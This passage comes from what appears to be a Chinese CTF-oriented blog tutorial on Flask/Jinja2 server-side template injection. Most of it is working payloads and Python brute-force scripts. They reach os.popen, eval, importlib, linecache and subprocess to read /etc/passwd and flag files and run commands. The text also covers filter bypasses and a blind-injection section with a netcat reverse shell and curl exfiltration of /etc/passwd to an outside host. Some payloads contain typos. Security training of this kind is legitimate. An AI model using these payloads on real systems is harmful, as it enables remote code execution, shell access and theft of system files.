class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">复制到notepad，把逗号&#x27;,&#x27;替换成&#x27;\n&#x27;（拓展）</span><br><span class="language-xml">然后查找常用注入模块</span><br><span class="language-xml">发现os._wrap_close在118行</span><br><span class="language-xml"></span><br><span class="language-xml">调用os.__wrap_close</span><br><span class="language-xml">name</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[117]&#125;&#125;</span><span class="language-xml">//注意列表的下标从0开始计数</span><br><span class="language-xml"></span><br><span class="language-xml">查看该模块是否被重载</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[117].__int__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">没有出现wrapper字眼，说明已经重载</span><br><span class="language-xml"></span><br><span class="language-xml">查看全局变量，有哪些可以使用的方法函数等</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[117].__int__.__globals__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">执行ls命令</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[117].__int__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__impot(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">这个比较复杂，因为这里利用的是builtins下的eval，然后加载os模块</span><br><span class="language-xml"></span><br><span class="language-xml">可以直接调用popen，或者直接利用eval然后import</span><br><span class="language-xml">直接利用popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[117].__int__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;cat /etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">这里的read是为了使命令执行有回显</span><br></code></pre></td></tr></table></figure><hr><h2 id="ssti常用注入模块"><a href="#ssti常用注入模块" class="headerlink" title="ssti常用注入模块"></a>ssti常用注入模块</h2><p>原理：</p><p>调用父类其他子类下可利用模块、函数等</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-9.png"></p><hr><p><strong>常用注入模块</strong></p><ol><li><strong>文件读取</strong></li><li><strong>内建函数eval执行命令</strong></li><li><strong>os模块执行命令</strong></li><li><strong>importlib类执行命令</strong></li><li><strong>linecache函数执行命令</strong></li><li><strong>subprocess.Popen类执行命令</strong></li></ol><hr><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><h4 id="查找所需子类"><a href="#查找所需子类" class="headerlink" title="查找所需子类"></a>查找所需子类</h4><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">查找子类_frozen_importlib_external.FileLoader对应的下标<br>&lt;<span class="hljs-keyword">class</span><span class="hljs-string">&#x27;_frozen_importlib_external.FileLoader&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>用python脚本查找</strong></p><p><strong>POST提交”name”的值，通过for循环查找所需字符串</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;xxx&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>data = &#123;<span class="hljs-string">&quot;xxx&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;]&#125;&#125;&quot;</span>&#125;<br><span class="hljs-keyword">try</span>:<br>response = requests.post(url,data=data)<br><span class="hljs-comment">#print(response.text)</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;_frozen_importlib_external.FileLoader&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>找到所需子类<code>_frozen_importlib_external.FileLoader</code>对应的编号</p><h4 id="FileLoader的利用"><a href="#FileLoader的利用" class="headerlink" title="FileLoader的利用"></a>FileLoader的利用</h4><p><strong>get_data方法</strong></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[<span class="hljs-string">&quot;get_data&quot;</span>]</span>(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;/etc/passwd&quot;</span>)<br>调用<span class="hljs-selector-tag">get_data</span>方法，传入参数<span class="hljs-number">0</span>和文件路径<br></code></pre></td></tr></table></figure><p><strong>读取文件</strong></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__classa__.__mro__</span>[1].__subclasses__()[79][&quot;get_data&quot;](<span class="hljs-name">0</span>,<span class="hljs-string">&quot;/etc/passwd&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><strong>读取配置文件下的FLAG</strong></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="内建函数eval执行命令"><a href="#内建函数eval执行命令" class="headerlink" title="内建函数eval执行命令"></a>内建函数eval执行命令</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">__builtins__提供对Python的所有<span class="hljs-string">&quot;内置&quot;</span>标识符的直接访问<br><span class="hljs-function"><span class="hljs-title">eval</span><span class="hljs-params">()</span></span>计算字符串表达式的值<br>__import__加载os模块<br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span>执行一个shell以运行命令来开启一个进程，执行cat /etc/passwd（system没有回显）<br></code></pre></td></tr></table></figure><p><strong>内建函数：python在执行脚本自动加载的函数</strong></p><p>python脚本查看可利用内建函数eval的模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://node5.anna.nssctf.cn:21889/level/1&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>data = &#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;].__int__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span>&#125;<br><span class="hljs-keyword">try</span>:<br>response = requests.post(url,data=data)<br><span class="hljs-comment">#print(response.text)</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><hr><p>payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__bases__</span>[0].__subclasses__()[65].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /etc/passwd&quot;).read()&#x27;</span>)<span class="hljs-string">&#x27;&#125;&#125;</span></span><br></code></pre></td></tr></table></figure><h3 id="os模块执行命令（常用）"><a href="#os模块执行命令（常用）" class="headerlink" title="os模块执行命令（常用）"></a>os模块执行命令（常用）</h3><p>在其他函数中直接调用os模块</p><p>通过config，调用os</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>通过url_for、lipsum，调用os</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__.os.popen</span>(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>在已经加载了os模块的子类里直接调用os模块</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__bases__</span>[0].__subclasses__()[199].__init__.__globlas__[&#x27;os&#x27;].popen(<span class="hljs-name">&quot;ls -l /opt&quot;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><hr><p><strong>python脚本查找已经加载os模块的子类</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;xxx&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>data = &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;].__init__.__globals__&#125;&#125;&quot;</span>&#125;<br><span class="hljs-keyword">try</span>:<br>response = requests.post(url,data=data)<br><span class="hljs-comment">#print(response.text)</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os.py&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>会找到所有加载了os模块的子类</p><p>这里假设426编号的子类加载了os模块</p><p>找到之后执行命令payload</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[426].__init__.__globals__.os.popen(<span class="hljs-name">&#x27;id&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="importlib类执行命令（用的不多）"><a href="#importlib类执行命令（用的不多）" class="headerlink" title="importlib类执行命令（用的不多）"></a>importlib类执行命令（用的不多）</h3><p>可以加载第三方库，使用load_module加载os</p><p><strong>python脚本查找_frozen_importlib.Builtinlmporter</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;xxx&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>data = &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;]&#125;&#125;&quot;</span>&#125;<br><span class="hljs-keyword">try</span>:<br>response = requests.post(url,data=data)<br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;_frozen_importlib.Builtinlmporter&#x27;</span> <span class="hljs-keyword">in</span> response,text:<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>假设这里找到importlib类为69编号</p><p>然后可以加载第三方库，使用load_module加载os</p><p>和前面几种方法不一样，前面几种是类中本身存在os模块，这里是去导入该模块，相当于import os</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[69][&quot;load_module&quot;](<span class="hljs-name">&quot;os&quot;</span>)[&quot;popen&quot;](<span class="hljs-name">&quot;ls -l /opt&quot;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><hr><h3 id="linecache函数执行命令"><a href="#linecache函数执行命令" class="headerlink" title="linecache函数执行命令"></a>linecache函数执行命令</h3><p>linecache函数可用于读取任意一个文件的某一行，而这个函数中也引入了os模块，所以我们也可以利用这个linecache函数去执行命令</p><p>python脚本查找linecache</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;xxx&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>data = &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;].__init__.__globals__&#125;&#125;&quot;</span>&#125;<br><span class="hljs-keyword">try</span>:<br>response = requests.post(url,data=data)<br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;linecache&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>利用linecache函数执行命令</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[191].__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(<span class="hljs-name">&quot;ls -l /&quot;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">xxxxxxxxxx </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[192].__init__.__globals__.linecache.os,popen(<span class="hljs-name">&quot;ls -l /&quot;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><hr><h3 id="subprocess-Popen类执行命令"><a href="#subprocess-Popen类执行命令" class="headerlink" title="subprocess.Popen类执行命令"></a>subprocess.Popen类执行命令</h3><p>从python2.4版本开始，可以用subprocess这个模块来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以的到子进程的返回值。</p><p>subprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen 等函数。</p><p>​python脚本查找subprocess.Popen</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;xxx&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>data = &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;]&#125;&#125;&quot;</span>&#125;<br><span class="hljs-keyword">try</span>:<br>response = requests.post(url,data=data)<br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>假设这里查到subprocess.Popen类的编号为200</p><p>然后构造payload执行命令</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[200](<span class="hljs-name">&#x27;ls /&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1),communicate()[0].strip()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>常用注入模块总结</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-10.png"></p><hr><h1 id="ssti绕过方法"><a href="#ssti绕过方法" class="headerlink" title="ssti绕过方法"></a>ssti绕过方法</h1><h2 id="绕过过滤双大括号"><a href="#绕过过滤双大括号" class="headerlink" title="绕过过滤双大括号"></a>绕过过滤双大括号</h2><p><strong><code>&#123;% %&#125;</code>使用介绍</strong></p><p><code>&#123;% %&#125;</code>是属于flask的控制语句，且以<code>&#123;% end... %&#125;</code>结尾</p><p>可以通过在控制语句定义变量或者写循环，判断。</p><hr><p>解题思路：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">判断</span><span class="hljs-template-variable">&#123;&#123;&#125;&#125;</span><span class="language-xml">被过滤</span><br><span class="language-xml">尝试&#123;% %&#125;</span><br><span class="language-xml">判断语句能否正常执行</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> <span class="hljs-number">2</span>&gt;<span class="hljs-number">1</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">Benben</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">endif</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__ <span class="hljs-template-tag">%&#125;</span><span class="language-xml">Benben</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">endif</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">有回显Benben说明 &#x27;&#x27;.__class__有内容</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> <span class="hljs-string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="hljs-string">&#x27;+str(i)+&#x27;</span>].__init__.__globals__[<span class="hljs-string">&quot;popen&quot;</span>](<span class="hljs-string">&quot;cat /etc/passwd&quot;</span>).read()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">Benben</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">endif</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">如果有回显Benben则说明命令正常执行</span><br></code></pre></td></tr></table></figure><p>这里有点像sql盲注，也是用的if条件判断</p><p><strong>构造python脚本查询可使用”popen”的子类编号</strong></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> requests<br><span class="hljs-title">url</span> = <span class="hljs-string">&quot;xxx&quot;</span><br><span class="hljs-title">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">500</span>):<br>try:<br><span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;&quot;<span class="hljs-title">code</span>&quot;:&#x27;&#123;% <span class="hljs-title">if</span> &quot;&quot;.<span class="hljs-title">__class__</span>.<span class="hljs-title">__base__</span>.<span class="hljs-title">__subclasses__</span>()[&#x27;+<span class="hljs-title">str</span>(<span class="hljs-title">i</span>)+&#x27;].<span class="hljs-title">__init__</span>.<span class="hljs-title">__globals__</span>[&quot;<span class="hljs-title">popen</span>&quot;](&quot;<span class="hljs-title">cat</span> /<span class="hljs-title">etc</span>/<span class="hljs-title">passwd</span>&quot;).<span class="hljs-title">read</span>() %&#125;<span class="hljs-type">Benben</span>&#123;% <span class="hljs-title">endif</span> %&#125;&#x27;&#125;</span><br>response = requests.post(url,<span class="hljs-class"><span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Benben&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>print(i,<span class="hljs-string">&quot;---&gt;&quot;</span>,<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br>break<br>except:<br>pass<br></code></pre></td></tr></table></figure><p>这里用脚本查到编号为133</p><p><strong>然后构造payload：</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">将脚本输出的payload部分提出来然后使用<span class="hljs-built_in">print</span>()执行命令就能够回显了<br><br>&#123;% <span class="hljs-built_in">print</span>(&quot;&quot;.__class__.__base__.__subclasses__()<span class="hljs-selector-attr">[133]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;popen&quot;</span>]</span>(&quot;cat /app/flag&quot;)<span class="hljs-selector-class">.read</span>())%&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="无回显ssti"><a href="#无回显ssti" class="headerlink" title="无回显ssti"></a>无回显ssti</h2><p><strong>ssti盲注思路</strong></p><p>1、反弹shell</p><p>通过rce反弹一个shell出来绕过无回显的页面</p><p>2、带外注入</p><p>通过requestbin或dnslog的方式将信息传到外界</p><p>3、纯盲注</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><strong>没有回显，</strong></p><p><strong>直接使用脚本批量执行希望执行的命令</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;xxx&#x27;</span><span class="hljs-comment">#目标主机地址</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):<br><span class="hljs-keyword">try</span>:<br>data = &#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 192.168.1.161 7777 -e /bin/bash&quot;).read()&#125;&#125;&#x27;</span>&#125;<br>response = requests.post(url,data=data)<span class="hljs-comment">#查找包含popen的子类来执行命令</span><br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>for i in range循环执行</p><p>当遇到包含popen的子类时</p><p>直接执行netcat 192.168.1.161 7777 -e &#x2F;bin&#x2F;bash</p><p>监听主机收到反弹shell进入对方命令行界面</p><hr><h3 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h3><p>此处使用wget()方法来带外想要知道的内容</p><p>也可以用dnslog或者nc</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">import requests</span><br><span class="language-xml"></span><br><span class="language-xml">url = &quot;xxx&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">for i in range(300):</span><br><span class="language-xml">try:</span><br><span class="language-xml">data = &#123;&quot;code&quot;:&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[&#x27;+str(i)+&#x27;].__init__.__globals__[&quot;popen&quot;](<span class="hljs-name">&quot;curl http://192.168.1.161/`cat /etc/passwd`&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#x27;&#125;</span><br><span class="language-xml">response = requests.post(url,data=data)</span><br><span class="language-xml">except:</span><br><span class="language-xml">pass</span><br></code></pre></td></tr></table></figure><p>同时kali开启一个python http监听</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><hr><h3 id="纯盲注"><a href="#纯盲注" class="headerlink" title="纯盲注"></a>纯盲注</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 